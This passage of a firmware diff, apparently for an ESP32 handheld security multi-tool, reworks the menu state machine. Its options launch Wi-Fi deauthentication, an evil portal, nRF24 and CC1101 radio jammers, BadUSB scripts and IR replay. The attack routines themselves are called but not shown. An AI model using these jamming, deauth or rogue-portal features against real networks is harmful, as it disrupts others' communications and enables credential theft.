+    needRedraw = true;
           break;
-        case 4:
+
+        // ---- Bluetooth ----
+        case STATE_BLUETOOTH_SCAN:
+          if (bleSelectedIdx == (int)bleDevices.size()) {
+            appState = STATE_BLUETOOTH_MENU;
+            bluetoothMenuIdx = 0;
+          } else {
+            showMsg("Device selected");
+          }
+          needRedraw = true;
+          break;
+        case STATE_BLUETOOTH_MENU:
+          if (bluetoothMenuIdx == 0) {
+            performBleScan();
+            appState = STATE_BLUETOOTH_SCAN;
+          } else {
+            appState = STATE_MAIN_MENU;
+          }
+          needRedraw = true;
+          break;
+
+        // ---- BadUSB ----
+        case STATE_BADUSB_MENU:
+          if (badUsbMenuIdx == 0) {
+            appState = STATE_BADUSB_BUILTIN;
+            badUsbBuiltinIdx = 0;
+          } else if (badUsbMenuIdx == 1) {
+            badUsbFileList.clear();
+            badUsbFileIdx = 0;
+            appState = STATE_BADUSB_SD;
+          } else {
+            appState = STATE_MAIN_MENU;
+          }
+          needRedraw = true;
+          break;
+        case STATE_BADUSB_BUILTIN:
+          if (badUsbBuiltinIdx == badUsbBuiltinCount) {
+            appState = STATE_BADUSB_MENU;
+          } else {
+            badUsbRunBuiltin(badUsbBuiltinIdx);
+          }
+          needRedraw = true;
+          break;
+        case STATE_BADUSB_SD:
+          if (badUsbFileIdx == (int)badUsbFileList.size()) {
+            appState = STATE_BADUSB_MENU;
+          } else if (!badUsbFileList.empty()) {
+            badUsbRunFile(badUsbFileList[badUsbFileIdx]);
+          }
+          needRedraw = true;
+          break;
+
+        // ---- LED ----
+        case STATE_LED_SELECT_DEVICE:
+          if (led_submenu_idx == 0) led_selected_device = 0;
+          else if (led_submenu_idx == 1) led_selected_device = 1;
+          else { appState = STATE_SETTINGS_MENU; break; }
+          appState = STATE_LED_MAIN_MENU;
+          led_submenu_idx = 0;
+          needRedraw = true;
+          break;
+        case STATE_LED_MAIN_MENU:
+          if (led_submenu_idx == 0) appState = STATE_LED_COLOR_MENU;
+          else if (led_submenu_idx == 1) appState = STATE_LED_EFFECT_MENU;
+          else if (led_submenu_idx == 2) appState = STATE_LED_BRIGHTNESS_MENU;
+          else if (led_submenu_idx == 3) appState = STATE_LED_TIMEOUT_MENU;
+          else appState = STATE_LED_SELECT_DEVICE;
+          needRedraw = true;
+          break;
+        case STATE_LED_COLOR_MENU:
+          saveLedSettings();
+          appState = STATE_LED_MAIN_MENU;
+          needRedraw = true;
+          break;
+        case STATE_LED_EFFECT_MENU:
+          saveLedSettings();
+          appState = STATE_LED_MAIN_MENU;
+          needRedraw = true;
+          break;
+        case STATE_LED_BRIGHTNESS_MENU:
+          saveLedSettings();
+          appState = STATE_LED_MAIN_MENU;
+          needRedraw = true;
+          break;
+        case STATE_LED_TIMEOUT_MENU:
+          saveLedSettings();
+          appState = STATE_LED_MAIN_MENU;
+          needRedraw = true;
+          break;
+
+        // ---- Storage ----
+        case STATE_STORAGE_INFO:
           appState = STATE_MAIN_MENU;
+          needRedraw = true;
           break;
+
+        // ---- WiFi ----
+        case STATE_WIFI_MENU:
+          switch (wifiMenuIdx) {
+            case 0: startWifiScan(); appState = STATE_WIFI_SCAN; break;
+            case 1: appState = STATE_WIFI_SPECTRUM; wifiSpectrumActive = true; break;
+            case 2: appState = STATE_WIFI_CHAT; break;
+            case 3: runDeauther(); break;
+            case 4: runEvilPortal(); break;
+            case 5: appState = STATE_MAIN_MENU; break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_WIFI_SCAN:
+          if (wifiSelectedIdx == -1) {
+            appState = STATE_WIFI_MENU;
+          } else if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
+            appState = STATE_WIFI_ACTIONS;
+            wifiActionIdx = 0;
+          }
+          needRedraw = true;
+          break;
+        case STATE_WIFI_SPECTRUM:
+          appState = STATE_WIFI_MENU;
+          wifiSpectrumActive = false;
+          needRedraw = true;
+          break;
+        case STATE_WIFI_ACTIONS:
+          switch (wifiActionIdx) {
+            case 0:
+              if (wifiList.size() > 0 && wifiSelectedIdx >= 0) appState = STATE_WIFI_INFO;
+              else showMsg("No network selected");
+              break;
+            case 1:
+              if (wifiList.size() > 0 && wifiSelectedIdx >= 0) {
+                deauthActive = !deauthActive;
+                if (deauthActive) showMsg("Deauth started");
+                else showMsg("Deauth stopped");
+              } else showMsg("Select network first");
+              break;
+            case 2:
+              deauthActive = false;
+              showMsg("Deauth stopped");
+              break;
+            case 3:
+              if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
+                String ssid = wifiList[wifiSelectedIdx].ssid;
+                String password = "";
+                bool found = false;
+                for (int i = 0; i < savedNetworksCount; i++) {
+                  if (savedSSID[i] == ssid) {
+                    password = savedPassword[i];
+                    found = true;
+                    break;
+                  }
+                }
+                if (!found) {
+                  password = inputStringWithKeyboard(true, "Enter password:");
+                }
+                if (password.length() > 0) {
+                  connectSsid = ssid;
+                  connectPassword = password;
+                  connectInProgress = true;
+                  connectStartTime = millis();
+                  WiFi.begin(ssid.c_str(), password.c_str());
+                  appState = STATE_WIFI_CONNECTING;
+                }
+              } else showMsg("Select network first");
+              break;
+            case 4:
+              if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
+                String ssid = wifiList[wifiSelectedIdx].ssid;
+                String password = inputStringWithKeyboard(true, "Enter password:");
+                if (password.length() > 0) {
+                  saveWiFiCredentials(ssid, password);
+                  showMsg("Saved");
+                }
+              } else showMsg("Select network first");
+              break;
+            case 5:
+              disconnectWiFi();
+              break;
+            case 6:
+              appState = STATE_WIFI_MENU;
+              break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_WIFI_INFO:
+          appState = STATE_WIFI_SCAN;
+          needRedraw = true;
+          break;
+
+        // ---- nRF24 ----
+        case STATE_NRF24_MENU:
+          switch (nrfMenuIdx) {
+            case 0: appState = STATE_NRF24_SPECTRUM; break;
+            case 1: runNrfEnhancedJammer(); break;
+            case 2: recheckNRF24(); appState = STATE_NRF24_MENU; break;
+            case 3: appState = STATE_MAIN_MENU; break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_NRF24_SPECTRUM:
+          appState = STATE_NRF24_MENU;
+          needRedraw = true;
+          break;
+
+        // ---- IR ----
+        case STATE_IR_MENU:
+          switch (irMenuIdx) {
+            case 0:
+              irCapturing = true;
+              irTempReady = false;
+              irTimeout = millis() + 10000;
+              appState = STATE_IR_CAPTURE;
+              break;
+            case 1:
+              irTxScroll = 0;
+              appState = STATE_IR_TRANSMIT;
+              break;
+            case 2:
+              eraseAllIrSlots();
+              needRedraw = true;
+              break;
+            case 3:
+              tvbgone_menu();
+              break;
+            case 4:
+              appState = STATE_MAIN_MENU;
+              break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_IR_CAPTURE:
+          if (irTempReady) {
+            irSlots[curIrSlot].isValid = true;
+            irSlots[curIrSlot].rawLength = tempRawLen;
+            for (int i = 0; i < tempRawLen; i++) irSlots[curIrSlot].rawBuffer[i] = tempRaw[i];
+            saveIrSlots();
+            showMsg("IR captured");
+          }
+          irCapturing = false;
+          appState = STATE_IR_MENU;
+          needRedraw = true;
+          break;
+        case STATE_IR_TRANSMIT:
+          if (irTxScroll == IR_SLOTS_COUNT) appState = STATE_IR_MENU;
+          else { sendIr(irTxScroll); showMsg("Sent"); }
+          needRedraw = true;
+          break;
+
+        // ---- Settings ----
+        case STATE_SETTINGS_MENU:
+          switch (settingsIdx) {
+            case 0: appState = STATE_SYSTEM_INFO; break;
+            case 1: appState = STATE_TIMEOUT; break;
+            case 2: appState = STATE_LED_SELECT_DEVICE; led_submenu_idx = 0; break;
+            case 3: appState = STATE_RESET_CONFIRM; break;
+            case 4: appState = STATE_REBOOT_CONFIRM; break;
+            case 5: appState = STATE_MAIN_MENU; break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_SYSTEM_INFO:
+          appState = STATE_SETTINGS_MENU;
+          needRedraw = true;
+          break;
+        case STATE_TIMEOUT:
+          displayTimeoutSec = timeoutVal;
+          saveTimeout();
+          appState = STATE_SETTINGS_MENU;
+          needRedraw = true;
+          break;
+        case STATE_RESET_CONFIRM:
+          // обрабатывается отдельно ниже
+          break;
+        case STATE_REBOOT_CONFIRM:
+          // обрабатывается отдельно ниже
+          break;
+        case STATE_CONFIRM_FACTORY_RESET:
+          // обрабатывается отдельно ниже
+          break;
+
+        // ---- CC1101 ----
+        case STATE_CC1101_MENU:
+          switch (cc1101_menu_idx) {
+            case 0: appState = STATE_CC1101_SPECTRUM_VERT; break;
+            case 1: appState = STATE_CC1101_SPECTRUM_HORIZ; break;
+            case 2: appState = STATE_CC1101_JAMMER; break;
+            case 3: appState = STATE_CC1101_CAPTURE; break;
+            case 4: appState = STATE_CC1101_TRANSMIT; break;
+            case 5: appState = STATE_MAIN_MENU; break;
+          }
+          needRedraw = true;
+          break;
+        case STATE_CC1101_SPECTRUM_VERT:
+          appState = STATE_CC1101_MENU;
+          needRedraw = true;
+          break;
+        case STATE_CC1101_SPECTRUM_HORIZ:
+          appState = STATE_CC1101_MENU;
+          needRedraw = true;
+          break;
+        case STATE_CC1101_JAMMER:
+          if (cc1101_jamming) stopCc1101Jammer();
+          else startCc1101Jammer();
+          needRedraw = true;
+          break;
+        case STATE_CC1101_CAPTURE:
+          if (cc1101_capturing) cc1101_capture_stop();
+          else cc1101_capture_start();
+          needRedraw = true;
+          break;
+        case STATE_CC1101_TRANSMIT:
+          if (cc1101_transmitting) cc1101_transmit_stop();
+          else cc1101_transmit_start();
+          needRedraw = true;
+          break;
+
+        default: break;
       }
-      needRedraw = true;
-      break;
-
-    case STATE_IR_CAPTURE:
-      if (irTempReady) {
-        irSlots[curIrSlot].isValid = true;
-        irSlots[curIrSlot].rawLength = tempRawLen;
-        for (int i = 0; i < tempRawLen; i++) irSlots[curIrSlot].rawBuffer[i] = tempRaw[i];
-        saveIrSlots();
-        showMsg("IR captured");
-      }
-      irCapturing = false;
-      appState = STATE_IR_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_IR_TRANSMIT:
-      if (irTxScroll == IR_SLOTS_COUNT) appState = STATE_IR_MENU;
-      else { sendIr(irTxScroll); showMsg("Sent"); }
-      needRedraw = true;
-      break;
-
-    // ==================== SETTINGS ====================
-    case STATE_SETTINGS_MENU:
-      switch (settingsIdx) {
-        case 0: appState = STATE_SYSTEM_INFO; break;
-        case 1: appState = STATE_TIMEOUT; break;
-        case 2: appState = STATE_LED_SELECT_DEVICE; led_submenu_idx = 0; break;
-        case 3: appState = STATE_RESET_CONFIRM; break;
-        case 4: appState = STATE_REBOOT_CONFIRM; break;
-        case 5: appState = STATE_MAIN_MENU; break;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_SYSTEM_INFO:
-      appState = STATE_SETTINGS_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_TIMEOUT:
-      displayTimeoutSec = timeoutVal;
-      saveTimeout();
-      appState = STATE_SETTINGS_MENU;
-      needRedraw = true;
-      break;
-
-    // ==================== CONFIRMATIONS ====================
-    case STATE_RESET_CONFIRM:
-      // handled by UP/DOWN
-      break;
-
-    case STATE_REBOOT_CONFIRM:
-      // handled by UP/DOWN
-      break;
-
-    case STATE_CONFIRM_FACTORY_RESET:
-      // handled by UP/DOWN
-      break;
-
-    // ==================== CC1101 ====================
-    case STATE_CC1101_MENU:
-      switch (cc1101_menu_idx) {
-        case 0: appState = STATE_CC1101_SPECTRUM_VERT; break;
-        case 1: appState = STATE_CC1101_SPECTRUM_HORIZ; break;
-        case 2: appState = STATE_CC1101_JAMMER; break;
-        case 3: appState = STATE_CC1101_CAPTURE; break;
-        case 4: appState = STATE_CC1101_TRANSMIT; break;
-        case 5: appState = STATE_MAIN_MENU; break;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_CC1101_SPECTRUM_VERT:
-      appState = STATE_CC1101_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_CC1101_SPECTRUM_HORIZ:
-      appState = STATE_CC1101_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_CC1101_JAMMER:
-      if (cc1101_jamming) stopCc1101Jammer();
-      else startCc1101Jammer();
-      needRedraw = true;
-      break;
-
-    case STATE_CC1101_CAPTURE:
-      if (cc1101_capturing) cc1101_capture_stop();
-      else cc1101_capture_start();
-      needRedraw = true;
-      break;
-
-    case STATE_CC1101_TRANSMIT:
-      if (cc1101_transmitting) cc1101_transmit_stop();
-      else cc1101_transmit_start();
-      needRedraw = true;
-      break;
-
-    // ==================== CHAT, CONSOLE etc. ====================
-    case STATE_WIFI_CHAT:
-      // handled elsewhere
-      break;
-
-    case STATE_CONSOLE:
-      // handled in consoleLoop
-      break;
-
-    case STATE_CONSOLE_COMMAND_OUTPUT:
-      // handled elsewhere
-      break;
-
-    case STATE_WIFI_CONNECTING:
-      // handled elsewhere
-      break;
-
-    default:
-      break;
+      delay(200);
+    }
   }
-  delay(200);
-}
-  }
+
+  // ============================================================
+  // ФОНОВЫЕ ЗАДАЧИ (спектры, джеммеры, IR, CC1101)
+  // ============================================================
   if (displayOn && displayTimeoutSec > 0 && (millis() - lastActivityTime) > (displayTimeoutSec * 1000UL)) setPower(false);
+
   if (appState == STATE_WIFI_SPECTRUM && wifiSpectrumActive) updateWifiSpectrum();
   if (appState == STATE_NRF24_SPECTRUM && nrfOk) updateNrfSpectrum();
   if (appState == STATE_NRF24_JAMMER && jamming && nrfOk && millis() - lastJamTime > JAM_INTERVAL_MS) updateJammer();
-  if (deauthActive && targetChan != 0 && millis() - lastDeauthTime > 100) { sendDeauth(); lastDeauthTime = millis(); }
+  if (deauthActive && targetChan != 0 && millis() - lastDeauthTime > 100) {
+    sendDeauth();
+    lastDeauthTime = millis();
+    if (appState == STATE_DEAUTHER) deauthPacketCount++;
+  }
   if (appState == STATE_IR_CAPTURE && irCapturing) processIrCapture();
+
   if (cc1101_ok) {
     if (appState == STATE_CC1101_SPECTRUM_VERT || appState == STATE_CC1101_SPECTRUM_HORIZ) updateCc1101Spectrum();
     if (appState == STATE_CC1101_JAMMER && cc1101_jamming) updateCc1101Jammer();
@@ -5084,38 +6161,46 @@ case STATE_BADUSB_SD:
       }
     }
   }
+
+  // ============================================================
+  // ОБРАБОТКА ПОДТВЕРЖДЕНИЙ (RESET, REBOOT, FACTORY RESET)
+  // ============================================================
   if (appState == STATE_RESET_CONFIRM) {
-    if (btnUp()) {
+    if (up) {
       clearAllPreferences();
       showMsg("Reset done");
       delay(2000);
       ESP.restart();
-    } else if (btnDown()) {
+    } else if (down) {
       appState = STATE_SETTINGS_MENU;
       needRedraw = true;
     }
   }
   if (appState == STATE_REBOOT_CONFIRM) {
-    if (btnUp()) {
+    if (up) {
       showMsg("Rebooting...");
       delay(1000);
       ESP.restart();
-    } else if (btnDown()) {
+    } else if (down) {
       appState = STATE_SETTINGS_MENU;
       needRedraw = true;
     }
   }
   if (appState == STATE_CONFIRM_FACTORY_RESET) {
-    if (btnUp()) {
+    if (up) {
       clearAllPreferences();
       showMsg("Factory reset done");
       delay(2000);
       ESP.restart();
-    } else if (btnDown()) {
+    } else if (down) {
       appState = STATE_MAIN_MENU;
       needRedraw = true;
     }
   }
+
+  // ============================================================
+  // ОБНОВЛЕНИЕ LED И ДИСПЛЕЯ
+  // ============================================================
   updateLedBoard();
   updateLedKeyboard();
   if (needRedraw && displayOn) updateDisplay();
